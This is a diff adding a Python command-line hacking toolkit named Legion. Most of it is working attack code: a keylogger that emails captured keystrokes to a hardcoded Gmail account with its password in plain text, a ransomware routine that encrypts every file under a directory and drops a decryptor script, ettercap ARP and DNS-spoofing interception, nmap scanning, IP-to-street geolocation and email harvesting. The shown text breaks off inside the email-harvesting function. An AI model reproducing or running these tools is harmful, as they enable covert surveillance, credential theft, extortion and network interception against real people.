@@ -1,0 +1,761 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#  LEGION
+#  Copyright 2022 Panda <panda@PANDA>
+
+#  This program is free software; you can redistribute it and/or modify
+#  it under the terms of the GNU General Public License as published by
+#  the Free Software Foundation; either version 2 of the License, or
+#  (at your option) any later version.
+
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+
+#  You should have received a copy of the GNU General Public License
+#  along with this program; if not, write to the Free Software
+#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
+#  MA 02110-1301, USA.
+
+# Author: Harold Eustaquio   
+
+# ============( IMPORT MODULES )==========
+
+from os import system
+try:
+	import random
+	import names
+	import keyboard
+	import smtplib 
+	from threading import Timer
+	from datetime import datetime
+	import socket, struct, os, sys, hashlib, pyfiglet, readline, cryptography, geocoder, folium
+	from cryptography.fernet import Fernet
+	from validate_email import validate_email
+	from random_address import real_random_address
+except ImportError:
+	system("pip3 install pyfiglet cryptography folium geocoder keyboard py3-validate-email names random-address")
+
+# ============( APP INFORMATION )==========
+
+app_id = 1033
+app_name = "Legion"
+last_Update_date = "Wed Jun 01"
+last_Update_time = "7:29 AM"
+d_ver = "1.1.6"
+release_mode = "DEVELOPER"
+
+# ============( INITIALIZE DEPENDENCY )==========
+
+def setup():
+	print("DOWNLOADING DEPENDENCY: ")
+	system("sudo pacman -S ettercap-gtk nmap python3 git curl wget wireshark-cli wireshark-qt --needed & pip3 install pyfiglet cryptography folium geocoder")
+	if os.path.exists("key/"):
+		print("\033[91m< KEY: 222: KEY FOLDER EXIST! >\033[0m")
+		with open("key/DEFAULT.key", "wb") as key_file: 
+			key_file.write("TZYpaJWqTgO6s0U26CxBYO7FU0g5iJwX6hgYGgfqLQQ=".encode()) 
+	else:
+		print("\033[91m< KEY: 404: KEY FOLDER NOT EXIST! >\033[0m")
+		system("mkdir key")
+		with open("key/DEFAULT.key", "wb") as key_file: 
+			key_file.write("TZYpaJWqTgO6s0U26CxBYO7FU0g5iJwX6hgYGgfqLQQ=".encode()) 
+		print("\033[92m< KEY: 111: CREATED KEY FILE! >\033[0m")
+
+# ============( SETUP FUNCTIONS )==============
+
+# KEYLOGGER
+SEND_REPORT_EVERY = 60 
+EMAIL_ADDRESS = "0110harold@gmail.com"
+EMAIL_PASSWORD = "izukishun10302001"
+
+# PHPMONITOR
+s = socket.socket()
+host = "0.0.0.0"
+port = 3389
+s.bind((host, port))
+
+# ============( ASCII ARTS )========================
+
+class ascii_art():
+	intro = f"""\n \033[91m█\033[0m Title: {app_name}            \033[92m█\033[0m Version: {d_ver}
+ 
+ \033[93m█\033[0m Developer: Harold Eustaquio \033[96m█\033[0m Year: 2022
+ 
+ \033[94m█\033[0m Github: \033[4mhttps://github.com/surelle-ha/\033[0m
+ 
+ \033[95m█\033[0m Note: 
+"""
+	header_1 = f"""\033[96m
+		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀
+		⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀
+		⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀
+		⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀
+		⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀
+		⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀
+		⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀
+		⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀
+		⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀
+		⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀
+		⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀
+		⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇
+		⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀
+		⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆
+		⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀
+		⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀
+		⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀
+		⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀v{d_ver}
+⠀⠀⠀⠀\033[0m"""
+
+# ============( FUNCTIONS )============
+
+class Keylogger:
+	def __init__(self, interval, report_method="email"):
+		self.interval = interval
+		self.report_method = report_method
+		self.log = ""
+		self.start_dt = datetime.now()
+		self.end_dt = datetime.now()
+     
+	def callback(self, event):
+		"""
+		This callback is invoked whenever a keyboard event is occured
+		(i.e when a key is released in this example)
+		"""
+		name = event.name
+		if len(name) > 1:
+			if name == "space":
+				name = " "
+			elif name == "enter":
+				name = "[ENTER]\n"
+			elif name == "decimal":
+				name = "."
+			else:
+				name = name.replace(" ", "_")
+				name = f"[{name.upper()}]"
+		self.log += name
+		
+	def update_filename(self):
+		start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+		end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+	def report_to_file(self):
+		"""This method creates a log file in the current directory that contains
+		the current keylogs in the `self.log` variable"""
+		# open the file in write mode (create it)
+		with open(f"{self.filename}.txt", "w") as f:
+			# write the keylogs to the file
+			print(self.log, file=f)
+		print(f"[+] Saved {self.filename}.txt")
+	 
+	def sendmail(self, email, password, message):
+		server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+		server.starttls()
+		server.login(email, password)
+		server.sendmail(email, email, message)
+		server.quit()
+		
+	def report(self):
+		"""
+		This function gets called every `self.interval`
+		It basically sends keylogs and resets `self.log` variable
+		"""
+		if self.log:
+			self.end_dt = datetime.now()
+			self.update_filename()
+			if self.report_method == "email":
+				self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+			elif self.report_method == "file":
+				self.report_to_file()
+			self.start_dt = datetime.now()
+		self.log = ""
+		timer = Timer(interval=self.interval, function=self.report)
+		timer.daemon = True
+		timer.start()
+		
+	def start(self):
+		self.start_dt = datetime.now()
+		keyboard.on_release(callback=self.callback)
+		self.report()
+		print(f"{datetime.now()} - Started keylogger")
+		keyboard.wait()
+		
+def getGateway():
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+
+def utf8Check(data):
+    try:
+       return data.decode('utf-8')
+    except UnicodeDecodeError:
+       return None
+       
+def loadKey(name):
+	try:
+		return open("key/" + name + ".key", "rb").read()
+	except FileNotFoundError:
+		print("\033[91m< KEY: 404: MISSING KEY FILE! >\033[0m")
+
+# ============( SYSTEM COMMAND ) ==============
+
+def app(action):
+	if action.lower() == "developer":
+		print("\t\033[94m█\033[0m Name: HAROLD EUSTAQUIO")
+		print("\t\033[92m█\033[0m Github: SURELLE-HA")
+		print("\t\033[96m█\033[0m Facebook: IVIRUS01110")
+		print("\t\033[93m█\033[0m EST-DATE: 2022")
+	elif action.lower() == "info":
+		print(ascii_art.intro)
+	elif action.lower() == "install":
+		system("sudo cp legion /usr/bin/")
+		system("sudo cp legion /usr/share/applications/")
+		system("sudo cp -r key /usr/bin/")
+		system("sudo cp -r key /usr/share/applications/")
+		print("\033[92m< INSTALL ACTION COMPLETED >\033[0m")
+	elif action.lower() == "update":
+		print("\033[92m< UPDATED: New version not available! >\033[0m")
+	elif action.lower() == "remove":
+		system("sudo rm -rf /usr/bin/legion")
+		system("sudo rm -rf /usr/share/applications/legion")
+		system("sudo rm -rf /usr/bin/key")
+		system("sudo rm -rf /usr/share/applications/key")
+		print("\033[92m< REMOVED FROM SYSTEM >\033[0m")
+		
+# ============( COMMANDS )============
+
+def helpnutri():
+	print("\tENCRYPTION COMMANDS:")
+	print("\t\tencrypt#key_name#String - Encrypt Text with default fernet encryption algorithm.")
+	print("\t\tdencrypt#key_name#encrypted_String - Decrypt Token with default fernet decryption algorithm.")
+	print("\t\tencryptd#key_name#String - Encrypt Text with default fernet encryption algorithm twice.")
+	print("\t\tdencryptd#key_name#encrypted_String - Decrypt Token with default fernet decryption algorithm twice.")
+	print("\t\tencryptmd5#key_name#String - Encrypt Text with md5 'one-way cryptographic' and default fernet encryption algorithm.")
+	print("\t\tencryptf#key_name#file_name - Encrypt File(UTF-8) with default fernet encryption algorithm.")
+	print("\t\tdecryptf#key_name#encrypted_file_name - Decrypt File(UTF-8) with default fernet decryption algorithm.")
+	print("\t\tencryptr#key_name#file_name - Encrypt File with default fernet encryption algorithm.")
+	print("\t\tdecryptr#key_name#encrypted_file_name - Decrypt File with default fernet decryption algorithm.")
+	print("\t\tbrute#Token' - Decrypt Token with random generate on-loop keys")
+	print("\t\twriteKey#new_key_name - Create new key and save it to a file.")
+	print("\t\tremoveKey#key_name - Delete key permanently.")
+	print("\t\tlistKey - List all Key file in the directory.")
+	print("\n\tBASICRANSOMWARE COMMANDS:")
+	print("\t\transomstart#key_name#path - Encrypt/Lock all files in the directory and subdirecties.")
+	print("\t\transomreverse#key_name#path - Decrypt/Unlock all files in the directory and subdirecties.")
+	print("\n\tRECONNAISSANCE COMMANDS:")
+	print("\t\tshow#ip - Show local IP address.")
+	print("\t\tshow#gateway - Show local gateway of router.")
+	print("\t\tshow#devices - List all connected device.")
+	print("\t\tipinfo#ip_address - Show all details of IP address.")
+	print("\t\tipmap#ip_address - Generate map location of the IP address. >> map.html")
+	print("\t\tveremail#emailaddress - Check email address if exists.")
+	print("\t\tharvemail - Check random email if exists and save to file >> harvested_email.txt.")
+	print("\n\tMITM COMMANDS:")
+	print("\t\tintercept#192.168.x.x - Launch MITM using ettercap.")
+	print("\n\tPHPMONITOR COMMANDS:")
+	print("\t\tphpmonitor#start - Start listening from PHP updates via socket.")
+	print("\t\tphpmonitor#generate - Generate PHP monitoring file.")
+	print("\n\tKEYLOGGER COMMANDS:")
+	print("\t\tkeylogger#local - Start Keylogger and save log file locally.")
+	print("\t\tkeylogger#email - Start Keylogger and send log file to email via SMTP")
+	print("\n\tAPP COMMANDS:")
+	print("\t\tapp#developer - Show Developer Information.")
+	print("\t\tapp#info - Show App Information.")
+	print("\t\tapp#install - Install Legion to system.")
+	print("\t\tapp#remove - Remove Legion from system.")
+	print("\t\tapp#update - Update to newer version.")
+	print("\n\tADDITIONAL TOOLS:")
+	print("\t\tpent#load - Show all additional pentesting tools.")
+	print("\t\tpent#load#search_string - Search specific tool.")
+	print("\t\tpent#get#tool_name - Download pentesting tool.")
+	print("\n\tOTHER COMMANDS:")
+	print("\t\tdisplay#sometext - Print function.")
+	print("\t\tclear - Clear screen.")
+	print("\t\trestart - Restart Legion.")
+	print("\t\tsyscom#command - Run installed system commands.")
+	
+def writeKey(name):
+	if name == "":
+		print("\033[91m< NAME: 404: MISSING FILE NAME! >\033[0m")
+	else:
+		key = Fernet.generate_key() 
+		with open("key/" + name + ".key", "wb") as key_file: 
+			key_file.write(key) 
+		print("\033[92m< KEY: 111: CREATED KEY FILE! >\033[0m")
+
+def listKey():
+	dir_path = r'key/'
+	for path in os.listdir(dir_path):
+		if os.path.isfile(os.path.join(dir_path, path)) and os.path.join(dir_path, path).endswith(".key"):
+			path = path.split(".")
+			print("[\033[92m&\033[0m] \033[92m" + path[0] + "\033[0m")
+			
+def removeKey(name):
+	if os.path.exists("key/" + name + ".key"):
+	  os.remove("key/" + name + ".key")
+	  print("\033[91m< KEY: 222: KEY FILE DELETED! >\033[0m")
+	else:
+	  print("\033[91m< KEY: 404: KEY FILE NOT EXIST! >\033[0m")
+
+def brute(token):
+	tested_Key = 0
+	while True:
+		try:
+			key = Fernet.generate_key()
+			Fern = Fernet(key)
+			dText = Fern.decrypt(token.encode())
+			print(f"[ \033[92m*\033[0m ] \033[92mKey {tested_Key} : {key.decode('utf-8')}\033[0m [\033[92mFOUND KEY!\033[0m]")
+			print("\033[92mRESULT:\033[0m \033[95m" + dText.decode("utf-8") + "\033[0m")
+			break
+		except (cryptography.fernet.InvalidToken, TypeError):
+			print(f"[ \033[92m*\033[0m ] \033[91mKey {tested_Key} : {key.decode('utf-8')}\033[0m [\033[91mINVALID KEY!\033[0m]")
+			tested_Key += 1
+			continue
+	
+def encrypt(key, text):
+	Fern = Fernet(loadKey(key))
+	token = Fern.encrypt(text.encode())
+	print("\033[92mRESULT:\033[0m \033[95m" + token.decode("utf-8") + "\033[0m")
+
+def doubleEncrypt(key, text):
+	Fern = Fernet(loadKey(key))
+	token = Fern.encrypt(text.encode())
+	token = Fern.encrypt(token)
+	print("\033[92mRESULT:\033[0m \033[95m" + token.decode("utf-8") + "\033[0m")
+
+def fileEncrypt(key, fileloc):
+	data = open(fileloc, "rb").read()
+	udata = utf8Check(data)
+	if udata is None:
+		print("\033[91m< UNI: 500: INVALID FILE>\033[0m")
+	else:
+		try:
+			Fern = Fernet(loadKey(key))
+			with open(fileloc, 'rb') as file:
+				original = file.read()
+			encrypted = Fern.encrypt(original)
+			with open(fileloc, 'wb') as encrypted_file:
+				encrypted_file.write(encrypted)
+			print("\033[92m< ENCRYPTED >\033[0m")
+		except FileNotFoundError:
+			print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+		except (cryptography.fernet.InvalidToken, TypeError):
+			print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+			
+def rEncrypt(key, fileloc):
+	try:
+		Fern = Fernet(loadKey(key))
+		with open(fileloc, 'rb') as file:
+			original = file.read()
+		encrypted = Fern.encrypt(original)
+		with open(fileloc, 'wb') as encrypted_file:
+			encrypted_file.write(encrypted)
+		print("\033[92m< ENCRYPTED >\033[0m")
+	except IsADirectoryError:
+		target = os.scandir(fileloc)
+		for entry in target:
+			if entry.is_dir() or entry.is_file():
+				Fern = Fernet(loadKey(key))
+				with open(fileloc + "/" + entry.name, 'rb') as file:
+					original = file.read()
+				encrypted = Fern.encrypt(original)
+				with open(fileloc + "/" + entry.name, 'wb') as encrypted_file:
+					encrypted_file.write(encrypted)
+				print("\033[92m< ENCRYPTED >\033[0m")
+	except FileNotFoundError:
+		print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+	except (cryptography.fernet.InvalidToken, TypeError):
+		print("\033[91m< KEY: 500: INVALID TOKEN >\033[0m")
+	
+def encryptmd5(key, text):
+	mdtstr = hashlib.md5(text.encode()).hexdigest()
+	Fern = Fernet(loadKey(key))
+	token = Fern.encrypt(mdtstr.encode())
+	print("\033[92mRESULT:\033[0m \033[95m" + token.decode("utf-8") + "\033[0m")
+	
+def decrypt(key, token):
+	try:
+		Fern = Fernet(loadKey(key))
+		dText = Fern.decrypt(token.encode())
+		print("\033[92mRESULT:\033[0m \033[95m" + dText.decode("utf-8") + "\033[0m")
+	except (cryptography.fernet.InvalidToken, TypeError):
+		print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+
+def doubleDecrypt(key, token):
+	try:
+		Fern = Fernet(loadKey(key))
+		dText = Fern.decrypt(token.encode())
+		dText = Fern.decrypt(dText)
+		print("\033[92mRESULT:\033[0m \033[95m" + dText.decode("utf-8") + "\033[0m")
+	except (cryptography.fernet.InvalidToken, TypeError):
+		print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+
+def fileDecrypt(key, fileloc):
+	data = open(fileloc, "rb").read()
+	udata = utf8Check(data)
+	if udata is None:
+		print("\033[91m< UNI: 500: INVALID FILE>\033[0m")
+	else:
+		try:
+			Fern = Fernet(loadKey(key))
+			with open(fileloc, 'rb') as file:
+				original = file.read()
+			encrypted = Fern.decrypt(original)
+			with open(fileloc, 'wb') as encrypted_file:
+				encrypted_file.write(encrypted)
+			print("\033[92m< DECRYPTED >\033[0m")
+		except FileNotFoundError:
+			print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+		except (cryptography.fernet.InvalidToken, TypeError):
+			print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+			
+def rDecrypt(key, fileloc):
+	try:
+		Fern = Fernet(loadKey(key))
+		with open(fileloc, 'rb') as file:
+			original = file.read()
+		encrypted = Fern.decrypt(original)
+		with open(fileloc, 'wb') as encrypted_file:
+			encrypted_file.write(encrypted)
+		print("\033[92m< DECRYPTED >\033[0m")
+	except IsADirectoryError:
+		target = os.scandir(fileloc)
+		for entry in target:
+			if entry.is_dir() or entry.is_file():
+				Fern = Fernet(loadKey(key))
+				with open(fileloc + "/" + entry.name, 'rb') as file:
+					original = file.read()
+				encrypted = Fern.decrypt(original)
+				with open(fileloc + "/" + entry.name, 'wb') as encrypted_file:
+					encrypted_file.write(encrypted)
+				print("\033[92m< DECRYPTED >\033[0m")
+	except FileNotFoundError:
+		print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+	except (cryptography.fernet.InvalidToken, TypeError):
+		print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+
+def show(name):
+	if name.lower() == "ip":
+		system("ifconfig")
+	elif name.lower() == "gateway":
+		print("Gateway: " + getGateway())
+	elif name.lower() == "devices":
+		gateway = getGateway().split(".")
+		system(f"sudo nmap -sT -Pn -O {gateway[0]}.{gateway[1]}.{gateway[2]}.0/24")
+
+def wireshark():
+	system("sudo wireshark")
+
+def intercept(victim):
+	system(f"sudo ettercap -T -S -i wlan0 -P dns_spoof -M arp:remote /{getGateway()}// /{victim}//")
+	
+def phpmonitor(action):
+	if action.lower() == "start":
+		print(f"[ \033[93m*\033[0m ] > {host}\033[95m@\033[0m{port}] \033[92mReceiving updates..\033[0m")
+		s.listen(5)
+		try:
+			while True:
+				c, addr= s.accept()
+				data = c.recv(1024)
+				if data: 
+					if "STABLE" in data.decode("utf-8"):	print("[ \033[92m+\033[0m ] \033[92m" + data.decode("utf-8") + "\033[0m")
+					elif "WARNING" in data.decode("utf-8"):	print("[ \033[92m+\033[0m ] \033[93m" + data.decode("utf-8") + "\033[0m")
+					elif "CRITICAL" in data.decode("utf-8"):	print("[ \033[92m+\033[0m ] \033[91m" + data.decode("utf-8") + "\033[0m")
+					elif "ADMIN" in data.decode("utf-8"):	print("[ \033[92m+\033[0m ] \033[45m" + data.decode("utf-8") + "\033[0m")
+					else:
+						print("[ \033[92m+\033[0m ] \033[1m" + data.decode("utf-8") + "\033[0m")
+						if data.decode("utf-8") == "@exit":	exit()
+						elif data.decode("utf-8") == "@stop":	break
+				c.close()
+		except KeyboardInterrupt:
+			print("[ExceptionKey] serverSeek stopped!")
+	elif action.lower() == "generate":
+		with open('adminMonitor.php', 'w') as f:
+			f.write("""<?php 
+	# Version: 1.2.4 | developer: surelle-ha
+	# Usage: updateServer("Text Here", 1);
+	# Output: [STABLE]   ::1 -> [06-05-22 07:17:40] 'GET CGI/1.1 Apache/2.4.53 (Unix) PHP/8.1.5 HTTP/1.1 /UtilityAPI/SentroMonitor.php' Text Here -> ::1 <localhost>
+	# Usage: updateServer("Message12", 2);
+	# Output: [WARNING]  ::1 -> [06-05-22 07:17:40] 'GET CGI/1.1 Apache/2.4.53 (Unix) PHP/8.1.5 HTTP/1.1 /UtilityAPI/SentroMonitor.php' Message12 -> ::1 <localhost>
+	# Usage: updateServer("Mail12345", 3);
+	# Output: [CRITICAL] ::1 -> [06-05-22 07:17:40] 'GET CGI/1.1 Apache/2.4.53 (Unix) PHP/8.1.5 HTTP/1.1 /UtilityAPI/SentroMonitor.php' Mail12345 -> ::1 <localhost>
+	
+	date_default_timezone_set('Asia/Manila');
+	
+	function updateServer($updateText, $updateMark){
+		$host    = "<host_ip>"; // Change Server Host
+		$port    = <port>; // Change Server Port
+		if($updateMark == 1){
+			$message = "[STABLE]   ".$_SERVER['REMOTE_ADDR']." -> [".date('d-m-y h:i:s')."] '".$_SERVER['REQUEST_METHOD']." ".$_SERVER['GATEWAY_INTERFACE']." ".$_SERVER['SERVER_SOFTWARE']." ".$_SERVER['SERVER_PROTOCOL']." ".$_SERVER['REQUEST_URI']."' ".$updateText." -> ".$_SERVER['SERVER_ADDR']." <".$_SERVER['SERVER_NAME'].">";
+		}else if($updateMark == 2){
+			$message = "[WARNING]  ".$_SERVER['REMOTE_ADDR']." -> [".date('d-m-y h:i:s')."] '".$_SERVER['REQUEST_METHOD']." ".$_SERVER['GATEWAY_INTERFACE']." ".$_SERVER['SERVER_SOFTWARE']." ".$_SERVER['SERVER_PROTOCOL']." ".$_SERVER['REQUEST_URI']."' ".$updateText." -> ".$_SERVER['SERVER_ADDR']." <".$_SERVER['SERVER_NAME'].">";
+		}else if($updateMark == 3){
+			$message = "[CRITICAL] ".$_SERVER['REMOTE_ADDR']." -> [".date('d-m-y h:i:s')."] '".$_SERVER['REQUEST_METHOD']." ".$_SERVER['GATEWAY_INTERFACE']." ".$_SERVER['SERVER_SOFTWARE']." ".$_SERVER['SERVER_PROTOCOL']." ".$_SERVER['REQUEST_URI']."' ".$updateText." -> ".$_SERVER['SERVER_ADDR']." <".$_SERVER['SERVER_NAME'].">";
+		}else if($updateMark == 4){
+			$message = "[ADMIN]    ".$_SERVER['REMOTE_ADDR']." -> [".date('d-m-y h:i:s')."] '".$_SERVER['REQUEST_METHOD']." ".$_SERVER['GATEWAY_INTERFACE']." ".$_SERVER['SERVER_SOFTWARE']." ".$_SERVER['SERVER_PROTOCOL']." ".$_SERVER['REQUEST_URI']."' ".$updateText." -> ".$_SERVER['SERVER_ADDR']." <".$_SERVER['SERVER_NAME'].">";
+		}else if($updateMark == 0){
+			$message = $updateText;
+		}
+		$socket = socket_create(AF_INET, SOCK_STREAM, 0);
+		$result = socket_connect($socket, $host, $port); 
+		socket_write($socket, $message, strlen($message));
+		socket_close($socket);
+	}
+?>""")
+
+def pent(action, specific = 'all'): # NEED COLORING !
+	pentlib = ["phpvuln","sherlock","phoneinfoga","osintgram","dirsearch","ip-tracer"]
+	if action.lower() == "load":
+		if specific.lower() == "all":
+			print("PENTESTING TOOL LIBRARY LIST")
+			for i in range(0, len(pentlib)):
+				print(f"[ {i + 1} ] " + pentlib[i])
+			print(f"Result: {i + 1}")
+		else:
+			print(f"PENTESTING TOOL LIBRARY LIST [SEARCH: {specific}]")
+			matching = [s for s in pentlib if specific in s]
+			for i in range(0, len(matching)):
+				print(f"[ {i + 1} ] " + matching[i]) 
+			print(f"Result: {i + 1}")
+	elif action.lower() == "get":
+		if specific.lower() == "phpvuln": system("git clone https://github.com/ecriminal/phpvuln")
+		if specific.lower() == "sherlock": system("git clone https://github.com/sherlock-project/sherlock")
+		if specific.lower() == "phoneinfoga": system("git clone https://github.com/sundowndev/PhoneInfoga")
+		if specific.lower() == "osintgram": system("git clone https://github.com/Datalux/Osintgram")
+		if specific.lower() == "dirsearch": system("git clone https://github.com/maurosoria/dirsearch")
+		if specific.lower() == "ip-tracer": system("git clone https://github.com/rajkumardusad/IP-Tracer")
+		if specific.lower() == "phoneinfoga": system("git clone https://github.com/sundowndev/phoneinfoga")
+
+def ransomstart(key, dirr):
+	for path, subdirs, files in os.walk(dirr):
+		for name in files:
+			fileloc = os.path.join(path, name)
+			try:
+				Fern = Fernet(loadKey(key))
+				with open(fileloc, 'rb') as file:
+					original = file.read()
+				encrypted = Fern.encrypt(original)
+				with open(fileloc, 'wb') as encrypted_file:
+					encrypted_file.write(encrypted)
+				print(f"\033[92m< ENCRYPTED - {fileloc} >\033[0m")
+			except FileNotFoundError:
+				print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+			except (cryptography.fernet.InvalidToken, TypeError):
+				print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+	with open(dirr + "/ransom.py", "w") as ransomware: 
+		ransomware.write("""
+from os import system
+import socket, struct, os, sys, hashlib, pyfiglet, readline, cryptography
+from cryptography.fernet import Fernet
+def loadKey(name):
+	try:
+		return open(name, "rb").read()
+	except FileNotFoundError:
+		print("\033[91m< KEY: 404: MISSING KEY FILE! >\033[0m")
+def ransomreverse(key):
+	for path, subdirs, files in os.walk("."):
+		for name in files:
+			fileloc = os.path.join(path, name)
+			try:
+				Fern = Fernet(loadKey(key))
+				with open(fileloc, 'rb') as file:
+					original = file.read()
+				encrypted = Fern.decrypt(original)
+				with open(fileloc, 'wb') as encrypted_file:
+					encrypted_file.write(encrypted)
+				print(f"[92m< DECRYPTED - {fileloc}>[0m")
+			except FileNotFoundError:
+				print("[91m< KEY: 404: FILE NOT FOUND >[0m")
+			except (cryptography.fernet.InvalidToken, TypeError):
+				print("[91m< KEY: 500: INVALID TOKEN>[0m")
+if __name__ == "__main__":
+	while True:
+		key = input(f"[ [92m*[0m ] [93m[91mPASSWORD FILE: [0m ")
+		ransomreverse(key)
+		""") 
+	print("\033[92m< KEY: 111: CREATED RANSOMWARE FILE! >\033[0m")
+
+def ransomreverse(key, dirr):
+	for path, subdirs, files in os.walk(dirr):
+		for name in files:
+			fileloc = os.path.join(path, name)
+			try:
+				Fern = Fernet(loadKey(key))
+				with open(fileloc, 'rb') as file:
+					original = file.read()
+				encrypted = Fern.decrypt(original)
+				with open(fileloc, 'wb') as encrypted_file:
+					encrypted_file.write(encrypted)
+				print(f"\033[92m< DECRYPTED - {fileloc}>\033[0m")
+			except FileNotFoundError:
+				print("\033[91m< KEY: 404: FILE NOT FOUND >\033[0m")
+			except (cryptography.fernet.InvalidToken, TypeError):
+				print("\033[91m< KEY: 500: INVALID TOKEN>\033[0m")
+
+def ipinfo(ip):
+	ip_address = geocoder.ip(ip)
+	print("\033[92mHouse Number:\033[0m " + ip_address.housenumber)
+	print("\033[92mPostal:\033[0m " + ip_address.postal)
+	print("\033[92mStreet:\033[0m " + ip_address.street)
+	print("\033[92mCity:\033[0m " + ip_address.city)
+	print("\033[92mState:\033[0m " + ip_address.state)
+	print("\033[92mCountry:\033[0m " + ip_address.country)
+	print(ip_address.latlng)
+	print("\033[92m< INFO: 111: INFO GENERATED! >\033[0m")
+	
+def ipmap(ip):
+	ip_address = geocoder.ip(ip)
+	location = ip_address.latlng
+	map = folium.Map(location=location, zoom_start=10)
+	folium.CircleMarker(location=location, radius=50, color="red").add_to(map)
+	folium.Marker(location).add_to(map)
+	map.save("map.html")
+	print("\033[92m< MAP: 111: MAP GENERATED! >\033[0m")
+	
+def veremail(email): 
+	print(f"[ \033[96mM\033[0m ] Checking Email Address : _\033[93m{email}\033[0m_")
+	is_valid = validate_email(email)
+	if(is_valid):
+		print(f"[ \033[96m+\033[0m ] \033[93m{email}\033[0m ::: \033[92mEmail Exist.\033[0m")
+	else:
+		print(f"[ \033[96m+\033[0m ] \033[93m{email}\033[0m ::: \033[91mNo Email Found.\033[0m")
+		
+def harvemail(): 
+	try:
+		domain_list = ["gmail.com"]
